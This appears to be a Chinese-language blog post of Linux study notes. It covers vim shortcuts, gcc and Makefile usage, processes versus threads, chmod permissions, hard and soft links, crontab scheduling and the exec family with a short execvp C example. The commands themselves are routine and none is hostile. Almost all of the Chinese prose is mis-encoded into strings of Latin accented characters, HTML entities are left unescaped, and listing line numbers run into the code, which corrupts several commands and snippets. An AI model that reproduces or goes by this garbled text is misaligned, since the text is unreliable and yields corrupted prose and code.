ä¸€æ¨ªï¼šè¡¨ç¤ºå‚æ•°æ˜¯å­—ç¬¦å½¢å¼ï¼Œå¦‚ls -a ä¸¤æ¨ªï¼šè¡¨ç¤ºå‚æ•°æ˜¯å•è¯å½¢å¼ï¼Œå¦‚cp --help 5.2 vimç§»åŠ¨å…‰æ ‡ï¼šggç¬¬ä¸€è¡Œï¼ŒGæœ€åä¸€è¡Œï¼ŒXGç¬¬Xè¡Œï¼› åˆ é™¤ä¸€è¡Œï¼šdd åˆ é™¤å•è¯ï¼šdw å¤åˆ¶ä¸€è¡Œï¼šyy ç²˜è´´ä¸€è¡Œï¼šp é€€å‡ºç¼–è¾‘å™¨ æŒ‰é”® åŠŸèƒ½ è¯´æ˜ :w å°†ç¼“å†²åŒºå†™å…¥æ–‡ä»¶ï¼Œå³ä¿å­˜ä¿®æ”¹ :wq ä¿å­˜ä¿®æ”¹å¹¶é€€å‡º :x ä¿å­˜ä¿®æ”¹å¹¶é€€å‡º :q é€€å‡ºï¼Œå¦‚æœå¯¹ç¼“å†²åŒºè¿›è¡Œè¿‡ä¿®æ”¹ï¼Œåˆ™ä¼šæç¤º :q! å¼ºåˆ¶é€€å‡ºï¼Œæ”¾å¼ƒä¿®æ”¹ æ˜¾ç¤ºè¡Œæ•° :set nu å…‰æ ‡ç§»åŠ¨ æŒ‰é”® åŠŸèƒ½ è¯´æ˜ h,j,k,l ä¸Šï¼Œä¸‹ï¼Œå·¦ï¼Œå³ ctrl-e ç§»åŠ¨é¡µé¢ ctrl-f ä¸Šç¿»ä¸€é¡µ ctrl-b ä¸‹ç¿»ä¸€é¡µ ctrl-u ä¸Šç¿»åŠé¡µ ctrl-d ä¸‹ç¿»åŠé¡µ w è·³åˆ°ä¸‹ä¸€ä¸ªå­—é¦–ï¼ŒæŒ‰æ ‡ç‚¹æˆ–å•è¯åˆ†å‰² æ¥ä¸Šè¡¨ W è·³åˆ°ä¸‹ä¸€ä¸ªå­—é¦–ï¼Œé•¿è·³ï¼Œå¦‚end-of-lineè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå­— e è·³åˆ°ä¸‹ä¸€ä¸ªå­—å°¾ E è·³åˆ°ä¸‹ä¸€ä¸ªå­—å°¾ï¼Œé•¿è·³ b è·³åˆ°ä¸Šä¸€ä¸ªå­— B è·³åˆ°ä¸Šä¸€ä¸ªå­—ï¼Œé•¿è·³ 0 è·³è‡³è¡Œé¦–ï¼Œä¸ç®¡æœ‰æ— ç¼©è¿›ï¼Œå°±æ˜¯è·³åˆ°ç¬¬0ä¸ªå­—ç¬¦ ^ è·³è‡³è¡Œé¦–çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ $ è·³è‡³è¡Œå°¾ å¸¸ç”¨ gg è·³è‡³æ–‡é¦– å¸¸ç”¨ G è°ƒè‡³æ–‡å°¾ å¸¸ç”¨ 5gg/5G è°ƒè‡³ç¬¬5è¡Œ gd è·³è‡³å½“å‰å…‰æ ‡æ‰€åœ¨çš„å˜é‡çš„å£°æ˜å¤„ fx åœ¨å½“å‰è¡Œä¸­æ‰¾xå­—ç¬¦ï¼Œæ‰¾åˆ°äº†å°±è·³è½¬è‡³ ; é‡å¤ä¸Šä¸€ä¸ªfå‘½ä»¤ï¼Œè€Œä¸ç”¨é‡å¤çš„è¾“å…¥fx * æŸ¥æ‰¾å…‰æ ‡æ‰€åœ¨å¤„çš„å•è¯ï¼Œå‘ä¸‹æŸ¥æ‰¾ # æŸ¥æ‰¾å…‰æ ‡æ‰€åœ¨å¤„çš„å•è¯ï¼Œå‘ä¸ŠæŸ¥æ‰¾ åˆ é™¤å¤åˆ¶ æŒ‰escåï¼Œç„¶åggvGæˆ–è€…ggVG å…¨é€‰ï¼ˆé«˜äº®æ˜¾ç¤ºï¼‰ æŒ‰escåï¼Œç„¶åggyG å…¨éƒ¨å¤åˆ¶ æŒ‰escåï¼Œç„¶ådG å…¨éƒ¨åˆ é™¤ åŸºç¡€çš„ gcc and makefile æ“ä½œ1. gcc1.1 å•æ–‡ä»¶ç¼–è¯‘gcc test.c -o test 1.2 å¤šæ–‡ä»¶ç¼–è¯‘123gcc -c test1.c -o test1.ogcc -c test2.c -o test2.ogcc test1.o test2.o -o test 2.Makefileæ•°æ®ç»“æ„ä½œä¸šä¸­ç”¨åˆ°äº†makefile 123456789101112131415161718192021maincc:main.o compress.o pack.o hfman.o g++ pack.o compress.o main.o hfman.o -o compress_winmain.o:main.cpp g++ -c main.cpppack.o:pack.cpp g++ -c pack.cppcompress:compress.cpp g++ -c compress.cpphfman:hfman.cpp g++ -c hfman.cpp#maincc:main.o compress.o pack.o debugg.o\\ g++ pack.o compress.o main.o debugg.o -o compress_debug_co\\main.o:main.cpp\\ g++ -c main.cpp\\pack.o:pack.cpp\\ g++ -c pack.cpp\\compress:compress.cpp\\ g++ -c compress.cpp\\debugg:debugg.cpp\\ g++ -c debugg.cpp\\ æ³¨æ„æ³¨é‡Šç¼–å†™è§„èŒƒã€‚ è¿›ç¨‹ä¸çº¿ç¨‹1.è¿›ç¨‹ä¸çº¿ç¨‹åŒºåˆ«å¼•ç”¨ï¼šé“¾æ¥ ç¬¬ä¸€ä¸ªè¢«åˆ›é€ å‡ºæ¥çš„è¿›ç¨‹æ˜¯0å·è¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹åœ¨æ“ä½œç³»ç»Ÿå±‚é¢æ˜¯ä¸å¯è§çš„ï¼Œä½†å®ƒå­˜åœ¨ç€ã€‚0å·è¿›ç¨‹å®Œæˆäº†æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½åŠ è½½ä¸åˆæœŸè®¾å®šï¼Œç„¶åå®ƒåˆ›é€ äº†1å·è¿›ç¨‹(init)ï¼Œè¿™ä¸ª1å·è¿›ç¨‹å°±æ˜¯æ“ä½œç³»ç»Ÿçš„â€œè€¶ç¨£â€ã€‚1å·è¿›ç¨‹æ˜¯ä¸Šå¸æ´¾æ¥ç®¡ç†æ•´ä¸ªæ“ä½œç³»ç»Ÿçš„ï¼Œæ‰€ä»¥åœ¨ç”¨pstreeæŸ¥çœ‹è¿›ç¨‹æ ‘å¯çŸ¥ï¼Œ1å·è¿›ç¨‹ä½äºæ ‘æ ¹ã€‚å†ä¹‹åï¼Œç³»ç»Ÿçš„å¾ˆå¤šç®¡ç†ç¨‹åºéƒ½ä»¥è¿›ç¨‹èº«ä»½è¢«1å·è¿›ç¨‹åˆ›é€ å‡ºæ¥ï¼Œè¿˜åˆ›é€ äº†ä¸äººç±»æ²Ÿé€šçš„æ¡¥æ¢â€”â€”shellã€‚ä»é‚£ä¹‹åï¼Œäººç±»å¯ä»¥è·Ÿæ“ä½œç³»ç»Ÿè¿›è¡Œäº¤æµï¼Œå¯ä»¥ç¼–å†™ç¨‹åºï¼Œå¯ä»¥æ‰§è¡Œä»»åŠ¡ã€‚ã€‚ã€‚ æ— è®ºæ˜¯è¿›ç¨‹è¿˜æ˜¯çº¿ç¨‹ï¼Œå¯¹äºç¨‹åºå‘˜è€Œè¨€ï¼Œéƒ½æ˜¯ç”¨æ¥å®ç°å¤šä»»åŠ¡å¹¶å‘çš„æŠ€æœ¯æ‰‹æ®µã€‚äºŒè€…éƒ½å¯ä»¥ç‹¬ç«‹è°ƒåº¦ï¼Œå› æ­¤åœ¨å¤šä»»åŠ¡ç¯å¢ƒä¸‹ï¼ŒåŠŸèƒ½ä¸Šå¹¶æ— å·®å¼‚ã€‚å¹¶ä¸”äºŒè€…éƒ½å…·æœ‰å„è‡ªçš„å®ä½“ï¼Œæ˜¯ç³»ç»Ÿç‹¬ç«‹ç®¡ç†çš„å¯¹è±¡ä¸ªä½“ã€‚æ‰€ä»¥åœ¨ç³»ç»Ÿå±‚é¢ï¼Œéƒ½å¯ä»¥é€šè¿‡æŠ€æœ¯æ‰‹æ®µå®ç°äºŒè€…çš„æ§åˆ¶ã€‚è€Œä¸”äºŒè€…æ‰€å…·æœ‰çš„çŠ¶æ€éƒ½éå¸¸ç›¸ä¼¼ã€‚è€Œä¸”ï¼Œåœ¨å¤šä»»åŠ¡ç¨‹åºä¸­ï¼Œå­è¿›ç¨‹(å­çº¿ç¨‹)çš„è°ƒåº¦ä¸€èˆ¬ä¸çˆ¶è¿›ç¨‹(çˆ¶çº¿ç¨‹)å¹³ç­‰ç«äº‰ã€‚ è¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„åŸºæœ¬å•ä½ï¼Œçº¿ç¨‹æ˜¯è°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚ è¿™å¥ç»å…¸åè¨€å·²æµä¼ æ•°åå¹´ï¼Œå„ç§æ“ä½œç³»ç»Ÿæ•™æéƒ½å¯è§æ­¤æè¿°ã€‚ç¡®å®å¦‚æ­¤ï¼Œè¿™å°±æ˜¯äºŒè€…çš„æ˜¾è‘—åŒºåˆ«ã€‚è¯»è€…è¯·æ³¨æ„â€œåŸºæœ¬â€äºŒå­—ã€‚ç›¸ä¿¡æœ‰è¯»è€…çœ‹åˆ°å‰åŠå¥çš„æ—¶å€™å°±åœ¨å¿ƒé‡Œæ€è€ƒï¼Œâ€œè¿›ç¨‹å²‚ä¸æ˜¯ä¸èƒ½è°ƒåº¦ï¼Ÿâ€ï¼Œéä¹Ÿï¼è¿›ç¨‹å’Œçº¿ç¨‹éƒ½å¯ä»¥è¢«è°ƒåº¦ï¼Œå¦åˆ™å¤šè¿›ç¨‹ç¨‹åºè¯¥å¦‚ä½•è¿è¡Œå‘¢ï¼ åªæ˜¯ï¼Œçº¿ç¨‹æ˜¯æ›´å°çš„å¯ä»¥è°ƒåº¦çš„å•ä½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦è¾¾åˆ°çº¿ç¨‹çš„æ°´å¹³å°±å¯ä»¥è¢«è°ƒåº¦äº†ï¼Œè¿›ç¨‹è‡ªç„¶å¯ä»¥è¢«è°ƒåº¦ã€‚å®ƒå¼ºè°ƒçš„æ˜¯åˆ†é…èµ„æºæ—¶çš„å¯¹è±¡å¿…é¡»æ˜¯è¿›ç¨‹ï¼Œä¸ä¼šç»™ä¸€ä¸ªçº¿ç¨‹å•ç‹¬åˆ†é…ç³»ç»Ÿç®¡ç†çš„èµ„æºã€‚è‹¥è¦è¿è¡Œä¸€ä¸ªä»»åŠ¡ï¼Œæƒ³è¦è·å¾—èµ„æºï¼Œæœ€èµ·ç å¾—æœ‰è¿›ç¨‹ï¼Œå…¶ä»–å­ä»»åŠ¡å¯ä»¥ä»¥çº¿ç¨‹èº«ä»½è¿è¡Œï¼Œèµ„æºå…±äº«å°±è¡Œäº†ã€‚ ç®€è€Œè¨€ä¹‹ï¼Œè¿›ç¨‹çš„ä¸ªä½“é—´æ˜¯å®Œå…¨ç‹¬ç«‹çš„ï¼Œè€Œçº¿ç¨‹é—´æ˜¯å½¼æ­¤ä¾å­˜çš„ã€‚å¤šè¿›ç¨‹ç¯å¢ƒä¸­ï¼Œä»»ä½•ä¸€ä¸ªè¿›ç¨‹çš„ç»ˆæ­¢ï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–è¿›ç¨‹ã€‚è€Œå¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œçˆ¶çº¿ç¨‹ç»ˆæ­¢ï¼Œå…¨éƒ¨å­çº¿ç¨‹è¢«è¿«ç»ˆæ­¢(æ²¡æœ‰äº†èµ„æº)ã€‚è€Œä»»ä½•ä¸€ä¸ªå­çº¿ç¨‹ç»ˆæ­¢ä¸€èˆ¬ä¸ä¼šå½±å“å…¶ä»–çº¿ç¨‹ï¼Œé™¤éå­çº¿ç¨‹æ‰§è¡Œäº†exit()ç³»ç»Ÿè°ƒç”¨ã€‚ä»»ä½•ä¸€ä¸ªå­çº¿ç¨‹æ‰§è¡Œexit()ï¼Œå…¨éƒ¨çº¿ç¨‹åŒæ—¶ç­äº¡ã€‚ å…¶å®ï¼Œä¹Ÿæ²¡æœ‰äººå†™å‡ºåªæœ‰çº¿ç¨‹è€Œæ²¡æœ‰è¿›ç¨‹çš„ç¨‹åºã€‚å¤šçº¿ç¨‹ç¨‹åºä¸­è‡³å°‘æœ‰ä¸€ä¸ªä¸»çº¿ç¨‹ï¼Œè€Œè¿™ä¸ªä¸»çº¿ç¨‹å…¶å®å°±æ˜¯æœ‰mainå‡½æ•°çš„è¿›ç¨‹ã€‚å®ƒæ˜¯æ•´ä¸ªç¨‹åºçš„è¿›ç¨‹ï¼Œæ‰€æœ‰çº¿ç¨‹éƒ½æ˜¯å®ƒçš„å­çº¿ç¨‹ã€‚æˆ‘ä»¬é€šå¸¸æŠŠå…·æœ‰å¤šçº¿ç¨‹çš„ä¸»è¿›ç¨‹ç§°ä¹‹ä¸ºä¸»çº¿ç¨‹ã€‚ è¿›ç¨‹çš„å¤‡ä»½å…³ç³»æ£®ä¸¥ï¼Œåœ¨çˆ¶è¿›ç¨‹æ²¡æœ‰ç»“æŸå‰ï¼Œæ‰€æœ‰çš„å­è¿›ç¨‹éƒ½å°Šä»çˆ¶å­å…³ç³»ï¼Œä¹Ÿå°±æ˜¯è¯´Aåˆ›å»ºäº†Bï¼Œåˆ™Aä¸Bæ˜¯çˆ¶å­å…³ç³»ï¼ŒBåˆåˆ›å»ºäº†Cï¼Œåˆ™Bä¸Cä¹Ÿæ˜¯çˆ¶å­å…³ç³»ï¼ŒAä¸Cæ„æˆçˆ·å­™å…³ç³»ï¼Œä¹Ÿå°±æ˜¯è¯´Cæ˜¯Açš„å­™å­è¿›ç¨‹ã€‚åœ¨ç³»ç»Ÿä¸Šä½¿ç”¨pstreeå‘½ä»¤æ‰“å°è¿›ç¨‹æ ‘ï¼Œå¯ä»¥æ¸…æ™°çœ‹åˆ°å¤‡ä»½å…³ç³»ã€‚ å¤šçº¿ç¨‹é—´çš„å…³ç³»æ²¡æœ‰é‚£ä¹ˆä¸¥æ ¼ï¼Œä¸ç®¡æ˜¯çˆ¶çº¿ç¨‹è¿˜æ˜¯å­çº¿ç¨‹åˆ›å»ºäº†æ–°çš„çº¿ç¨‹ï¼Œéƒ½æ˜¯å…±äº«çˆ¶çº¿ç¨‹çš„èµ„æºï¼Œæ‰€ä»¥ï¼Œéƒ½å¯ä»¥è¯´æ˜¯çˆ¶çº¿ç¨‹çš„å­çº¿ç¨‹ï¼Œä¹Ÿå°±æ˜¯åªå­˜åœ¨ä¸€ä¸ªçˆ¶çº¿ç¨‹ï¼Œå…¶ä½™çº¿ç¨‹éƒ½æ˜¯çˆ¶çº¿ç¨‹çš„å­çº¿ç¨‹ã€‚ åŸºæœ¬å‘½ä»¤1.chmod # æƒé™ rwx äºŒè¿›åˆ¶ 7 è¯» + å†™ + æ‰§è¡Œ rwx 111 6 è¯» + å†™ rw- 110 5 è¯» + æ‰§è¡Œ r-x 101 4 åªè¯» râ€“ 100 3 å†™ + æ‰§è¡Œ -wx 011 2 åªå†™ -w- 010 1 åªæ‰§è¡Œ â€“x 001 0 æ—  â€” 000 2.è½¯è¿æ¥å’Œç¡¬é“¾æ¥2.1 ç¡¬é“¾æ¥ç¡¬é“¾æ¥æ˜¯é€šè¿‡ç´¢å¼•èŠ‚ç‚¹è¿›è¡Œçš„é“¾æ¥ã€‚åœ¨Linuxä¸­ï¼Œå¤šä¸ªæ–‡ä»¶æŒ‡å‘åŒä¸€ä¸ªç´¢å¼•èŠ‚ç‚¹æ˜¯å…è®¸çš„ï¼Œåƒè¿™æ ·çš„é“¾æ¥å°±æ˜¯ç¡¬é“¾æ¥ã€‚ç¡¬é“¾æ¥åªèƒ½åœ¨åŒä¸€æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ä¹‹é—´è¿›è¡Œé“¾æ¥ï¼Œä¸èƒ½å¯¹ç›®å½•è¿›è¡Œåˆ›å»ºã€‚å¦‚æœåˆ é™¤ç¡¬é“¾æ¥å¯¹åº”çš„æºæ–‡ä»¶ï¼Œåˆ™ç¡¬é“¾æ¥æ–‡ä»¶ä»ç„¶å­˜åœ¨ï¼Œè€Œä¸”ä¿å­˜äº†åŸæœ‰çš„å†…å®¹ï¼Œè¿™æ ·å¯ä»¥èµ·åˆ°é˜²æ­¢å› ä¸ºè¯¯æ“ä½œè€Œé”™è¯¯åˆ é™¤æ–‡ä»¶çš„ä½œç”¨ã€‚ç”±äºç¡¬é“¾æ¥æ˜¯æœ‰ç€ç›¸åŒ inode å·ä»…æ–‡ä»¶åä¸åŒçš„æ–‡ä»¶ï¼Œå› æ­¤ï¼Œåˆ é™¤ä¸€ä¸ªç¡¬é“¾æ¥æ–‡ä»¶å¹¶ä¸å½±å“å…¶ä»–æœ‰ç›¸åŒ inode å·çš„æ–‡ä»¶ã€‚ 12link oldfile newfile ln oldfile newfile 2.2 è½¯é“¾æ¥è½¯é“¾æ¥ï¼ˆä¹Ÿå«ç¬¦å·é“¾æ¥ï¼‰ä¸ç¡¬é“¾æ¥ä¸åŒï¼Œæ–‡ä»¶ç”¨æˆ·æ•°æ®å—ä¸­å­˜æ”¾çš„å†…å®¹æ˜¯å¦ä¸€æ–‡ä»¶çš„è·¯å¾„åçš„æŒ‡å‘ã€‚è½¯é“¾æ¥å°±æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œåªæ˜¯æ•°æ®å—å†…å®¹æœ‰ç‚¹ç‰¹æ®Šã€‚è½¯é“¾æ¥å¯å¯¹æ–‡ä»¶æˆ–ç›®å½•åˆ›å»ºã€‚ è½¯é“¾æ¥ä¸»è¦åº”ç”¨äºä»¥ä¸‹ä¸¤ä¸ªæ–¹é¢ï¼šä¸€æ˜¯æ–¹ä¾¿ç®¡ç†ï¼Œä¾‹å¦‚å¯ä»¥æŠŠä¸€ä¸ªå¤æ‚è·¯å¾„ä¸‹çš„æ–‡ä»¶é“¾æ¥åˆ°ä¸€ä¸ªç®€å•è·¯å¾„ä¸‹æ–¹ä¾¿ç”¨æˆ·è®¿é—®ï¼›å¦ä¸€æ–¹é¢å°±æ˜¯è§£å†³æ–‡ä»¶ç³»ç»Ÿç£ç›˜ç©ºé—´ä¸è¶³çš„æƒ…å†µã€‚ä¾‹å¦‚æŸä¸ªæ–‡ä»¶æ–‡ä»¶ç³»ç»Ÿç©ºé—´å·²ç»ç”¨å®Œäº†ï¼Œä½†æ˜¯ç°åœ¨å¿…é¡»åœ¨è¯¥æ–‡ä»¶ç³»ç»Ÿä¸‹åˆ›å»ºä¸€ä¸ªæ–°çš„ç›®å½•å¹¶å­˜å‚¨å¤§é‡çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥æŠŠå¦ä¸€ä¸ªå‰©ä½™ç©ºé—´è¾ƒå¤šçš„æ–‡ä»¶ç³»ç»Ÿä¸­çš„ç›®å½•é“¾æ¥åˆ°è¯¥æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œè¿™æ ·å°±å¯ä»¥å¾ˆå¥½çš„è§£å†³ç©ºé—´ä¸è¶³é—®é¢˜ã€‚åˆ é™¤è½¯é“¾æ¥å¹¶ä¸å½±å“è¢«æŒ‡å‘çš„æ–‡ä»¶ï¼Œä½†è‹¥è¢«æŒ‡å‘çš„åŸæ–‡ä»¶è¢«åˆ é™¤ï¼Œåˆ™ç›¸å…³è½¯è¿æ¥å°±å˜æˆäº†æ­»é“¾æ¥ã€‚ 12ln -s old.file soft.linkln -s old.dir soft.link.dir å®éªŒ1. crontabcrontab -eæ‰“å¼€è®¾ç½®æ–‡ä»¶ï¼Œcrontabå¯èƒ½å¹¶æ²¡æœ‰åœ¨ubuntuä¸Šå®‰è£…ï¼Œä½¿ç”¨sudo apt-get install æ¥å®‰è£…ã€‚ åœ¨crontab -eåæ‰“å¼€çš„æ–‡ä»¶é‡Œä¿®æ”¹ã€‚ ä¿®æ”¹çš„è§„åˆ™å¦‚ä¸‹ï¼š 1f1 f2 f3 f4 f5 program å…¶ä¸­ f1 æ˜¯è¡¨ç¤ºåˆ†é’Ÿï¼Œf2 è¡¨ç¤ºå°æ—¶ï¼Œf3 è¡¨ç¤ºä¸€ä¸ªæœˆä»½ä¸­çš„ç¬¬å‡ æ—¥ï¼Œf4 è¡¨ç¤ºæœˆä»½ï¼Œf5 è¡¨ç¤ºä¸€ä¸ªæ˜ŸæœŸä¸­çš„ç¬¬å‡ å¤©ã€‚program è¡¨ç¤ºè¦æ‰§è¡Œçš„ç¨‹åºã€‚ å½“ f1 ä¸º * æ—¶è¡¨ç¤ºæ¯åˆ†é’Ÿéƒ½è¦æ‰§è¡Œ programï¼Œf2 ä¸º * æ—¶è¡¨ç¤ºæ¯å°æ—¶éƒ½è¦æ‰§è¡Œç¨‹åºï¼Œå…¶é¦€ç±»æ¨ å½“ f1 ä¸º a-b æ—¶è¡¨ç¤ºä»ç¬¬ a åˆ†é’Ÿåˆ°ç¬¬ b åˆ†é’Ÿè¿™æ®µæ—¶é—´å†…è¦æ‰§è¡Œï¼Œf2 ä¸º a-b æ—¶è¡¨ç¤ºä»ç¬¬ a åˆ°ç¬¬ b å°æ—¶éƒ½è¦æ‰§è¡Œï¼Œå…¶é¦€ç±»æ¨ å½“ f1 ä¸º */n æ—¶è¡¨ç¤ºæ¯ n åˆ†é’Ÿä¸ªæ—¶é—´é—´éš”æ‰§è¡Œä¸€æ¬¡ï¼Œf2 ä¸º */n è¡¨ç¤ºæ¯ n å°æ—¶ä¸ªæ—¶é—´é—´éš”æ‰§è¡Œä¸€æ¬¡ï¼Œå…¶é¦€ç±»æ¨ å½“ f1 ä¸º a, b, c,â€¦ æ—¶è¡¨ç¤ºç¬¬ a, b, c,â€¦ åˆ†é’Ÿè¦æ‰§è¡Œï¼Œf2 ä¸º a, b, c,â€¦ æ—¶è¡¨ç¤ºç¬¬ a, b, câ€¦ä¸ªå°æ—¶è¦æ‰§è¡Œï¼Œå…¶é¦€ç±»æ¨ 12345678* * * * *- - - - -| | | | || | | | +----- æ˜ŸæœŸä¸­æ˜ŸæœŸå‡  (0 - 6) (æ˜ŸæœŸå¤© ä¸º0)| | | +---------- æœˆä»½ (1 - 12) | | +--------------- ä¸€ä¸ªæœˆä¸­çš„ç¬¬å‡ å¤© (1 - 31)| +-------------------- å°æ—¶ (0 - 23)+------------------------- åˆ†é’Ÿ (0 - 59) 1*/3 * * * * date &gt;&gt; /home/wangchenghua/hello.txt 2.exec execveå‡½æ•°æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ç³»ç»Ÿè°ƒç”¨ å…¶ä»–ä¸ºç»è¿‡åŒ…è£…çš„åº“å‡½æ•°ï¼Œæœ€ç»ˆè°ƒç”¨çš„è¿˜æ˜¯execveå‡½æ•°ã€‚ å¸¦â€œlâ€è¡¨ç¤ºä»¥åˆ—è¡¨çš„å½¢å¼ä¼ å‚æ•° å¸¦â€œvâ€è¡¨ç¤ºä»¥æ•°ç»„çš„å½¢å¼ä¼ å‚æ•° å¸¦â€œeâ€è¡¨ç¤ºå°†ç¯å¢ƒå˜é‡ä¼ é€’ç»™å‡½æ•° å¸¦â€œpâ€è¡¨ç¤ºç¬¬ä¸€ä¸ªå‚æ•°filenameä¸ç”¨è¾“å…¥å®Œæ•´çš„è·¯å¾„ï¼Œåªè¦ç»™å‡ºå‘½ä»¤åå³å¯ï¼Œå®ƒä¼šåœ¨ç¯å¢ƒå˜é‡PATHä¸­æŸ¥æ‰¾å‘½ä»¤ è¯¥å‡½æ•°å®šä¹‰åœ¨&lt;unistd.h&gt; 1234567891011#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;int main(){ char * argv[] = {&quot;wensen.sh&quot;, 0}; // æ•°ç»„æœ€åä¸€ä½éœ€è¦ä¸º0 execvp(&quot;/home/wensen/workspace/test/wensen.sh&quot;, argv); return 0;}â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/u011857683/article/details/81160059 éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‰§è¡Œçš„æ—¶å€™ï¼Œä¼ å…¥çš„å‚æ•°çš„ç¬¬ä¸€ä¸ªå¿…é¡»æ˜¯è¿™ä¸ªè¢«æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶åï¼Œæœ€åçš„ä¸€ä½æ•°ç»„å¿…é¡»æ˜¯0ï¼› ä¸ä¸€èˆ¬æƒ…å†µä¸åŒï¼Œexecå‡½æ•°æ—çš„å‡½æ•°æ‰§è¡ŒæˆåŠŸåä¸ä¼šè¿”å›ï¼Œå› ä¸ºè°ƒç”¨è¿›ç¨‹çš„å®ä½“ï¼ŒåŒ…æ‹¬ä»£ç æ®µï¼Œæ•°æ®æ®µå’Œå †æ ˆç­‰éƒ½å·²ç»è¢«æ–°çš„å†…å®¹å–ä»£ï¼Œåªç•™ä¸‹è¿›ç¨‹IDç­‰ä¸€äº›è¡¨é¢ä¸Šçš„ä¿¡æ¯ä»ä¿æŒåŸæ ·ï¼Œé¢‡æœ‰äº›ç¥ä¼¼â€ä¸‰åå…­è®¡â€ä¸­çš„â€é‡‘è‰è„±å£³â€ã€‚çœ‹ä¸Šå»è¿˜æ˜¯æ—§çš„èº¯å£³ï¼Œå´å·²ç»æ³¨å…¥äº†æ–°çš„çµé­‚ã€‚åªæœ‰è°ƒç”¨å¤±è´¥äº†ï¼Œå®ƒä»¬æ‰ä¼šè¿”å›ä¸€ä¸ª-1ï¼Œä»åŸç¨‹åºçš„è°ƒç”¨ç‚¹æ¥ç€å¾€ä¸‹æ‰§è¡Œã€‚ 3.è¿›ç¨‹è¿›ç¨‹ç”±ç¨‹åºäº§ç”Ÿï¼Œæ˜¯åŠ¨æ€çš„ï¼Œæ˜¯ä¸€ä¸ªè¿è¡Œç€çš„ã€è¦å ç”¨ç³»ç»Ÿè¿è¡Œèµ„æºçš„ç¨‹åºã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¿›ç¨‹å°±æ˜¯ç¨‹åºçš„ä¸€æ¬¡è¿è¡Œè¿‡ç¨‹ã€‚ç³»ç»Ÿç»™æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½åˆ†é…äº†ä¸€ä¸ªå”¯ä¸€çš„è¿›ç¨‹æ ‡è¯†ç¬¦ï¼ˆè¿›ç¨‹å·ï¼Œç®€ç§°PIDï¼‰ã€‚ è¿›ç¨‹ç›¸å…³çš„å‚æ•° PIDï¼šè¿›ç¨‹å·ï¼ˆProcess IDï¼‰ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†è¿›ç¨‹ã€‚ PPIDï¼šçˆ¶è¿›ç¨‹å·ï¼ˆParent PIDï¼‰ï¼Œåˆ›å»ºæŸè¿›ç¨‹çš„ä¸Šä¸€ä¸ªè¿›ç¨‹çš„è¿›ç¨‹å·ã€‚ USER/UIDï¼šå¯åŠ¨æŸä¸ªè¿›ç¨‹çš„ç”¨æˆ·IDå’Œè¯¥ç”¨æˆ·æ‰€å±ç»„çš„IDã€‚ STATï¼šè¿›ç¨‹çŠ¶æ€ï¼Œé¢å’Œè¿›ç¨‹å¯èƒ½å¤„äºå¤šç§çŠ¶æ€ï¼Œå¦‚è¿è¡Œã€ç­‰å¾…ã€åœæ­¢ã€ç¡çœ ã€åƒµæ­»ç­‰ã€‚ PRIORITYï¼šè¿›ç¨‹çš„ä¼˜å…ˆçº§ï¼Œæ•°å­—è¶Šå¤§è¡¨ç¤ºä¼˜å…ˆçº§è¶Šä½ã€‚ NICEï¼šè¿›ç¨‹çš„è°¦è®©åº¦ï¼Œè¡¨ç¤ºè¿›ç¨‹å¯¹CPUæ—¶é—´è¦æ±‚çš„è¿«åˆ‡ç¨‹åº¦ã€‚ èµ„æºå ç”¨ï¼šåŒ…æ‹¬CPUã€å†…å­˜ç­‰èµ„æºçš„å ç”¨ä¿¡æ¯ã€‚ è¿›ç¨‹çš„ç±»å‹ äº¤äº’è¿›ç¨‹ï¼šåœ¨Shellä¸‹é€šè¿‡æ‰§è¡Œç¨‹åºæ‰€äº§ç”Ÿçš„è¿›ç¨‹ï¼Œå¯åœ¨å‰å°æˆ–åå°è¿è¡Œã€‚ æ‰¹å¤„ç†è¿›ç¨‹ï¼šä¸€ä¸ªè¿›ç¨‹åºåˆ—ã€‚ å®ˆæŠ¤è¿›ç¨‹ï¼šåˆç§°ç›‘æ§è¿›ç¨‹ï¼Œæ˜¯æŒ‡é‚£äº›åœ¨åå°è¿è¡Œï¼Œå¹¶ä¸”æ²¡æœ‰æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹ï¼Œé€šå¸¸å¯ä»¥éšç€æ“ä½œç³»ç»Ÿçš„å¯åŠ¨è€Œè¿è¡Œï¼Œä¹Ÿå¯å°†å…¶ç§°ä¸ºæœåŠ¡ã€‚ åœ¨terminalä¸­ä½¿ç”¨pså‘½ä»¤æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„htopæŸ¥çœ‹ è¿›ç¨‹çš„åŸºæœ¬çŠ¶æ€ å°±ç»ªçŠ¶æ€ æ‰§è¡ŒçŠ¶æ€ é˜»å¡çŠ¶æ€ è¿›ç¨‹æ§åˆ¶å— ä¸ºäº†æè¿°å’Œæ§åˆ¶è¿›ç¨‹çš„è¿è¡Œï¼Œç³»ç»Ÿä¸ºæ¯ä¸ªè¿›ç¨‹å®šä¹‰äº†ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œè¯¥æ•°æ®ç»“æ„è¢«ç§°ä¸ºè¿›ç¨‹æ§åˆ¶å—PCBã€‚ PCBæ˜¯è¿›ç¨‹å­˜åœ¨çš„å”¯ä¸€æ ‡å¿—. è¿›ç¨‹å¯åŠ¨ 